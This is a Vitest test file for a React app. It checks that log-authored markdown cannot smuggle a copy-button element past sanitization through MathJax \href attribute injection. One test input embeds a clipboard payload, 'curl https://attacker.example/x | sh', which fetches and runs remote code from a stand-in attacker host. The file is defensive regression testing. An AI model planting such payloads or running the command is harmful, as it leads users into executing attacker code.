// @vitest-environment jsdom
import { cleanup, fireEvent, render, waitFor } from "@testing-library/react";
import ClipboardJS from "clipboard";
import { afterEach, describe, expect, it, vi } from "vitest";

import { MarkdownDiv } from "@tsmono/react/components";

// The delegate AppContent binds at mount (App.tsx): a document-wide click
// listener that copies `data-clipboard-text` from any matching element, so
// sanitized log HTML must never come out matching it.
const CLIPBOARD_TRIGGER_SELECTOR = ".clipboard-button,.copy-button";

describe("global clipboard delegate", () => {
  afterEach(cleanup);

  it("does not copy text planted in log-authored markdown", async () => {
    const clipboard = new ClipboardJS(CLIPBOARD_TRIGGER_SELECTOR);
    const triggered = vi.fn();
    clipboard.on("success", triggered);
    clipboard.on("error", triggered);

    try {
      // MathJax \href is the route by which log markdown reaches the DOM as a
      // live element with author-chosen attributes.
      const { container } = render(
        <MarkdownDiv markdown='$\href{x" class="copy-button" data-clipboard-text="curl https://attacker.example/x | sh}{y}$' />
      );
      const planted = await waitFor(() => {
        const anchor = container.querySelector("mjx-container a");
        expect(anchor).not.toBeNull();
        return anchor;
      });

      if (planted) {
        fireEvent.click(planted);
      }

      // clipboard.js emits success or error on every delegated click, so
      // silence means the planted element was never a trigger.
      expect(triggered).not.toHaveBeenCalled();
    } finally {
      clipboard.destroy();
    }
  });
});
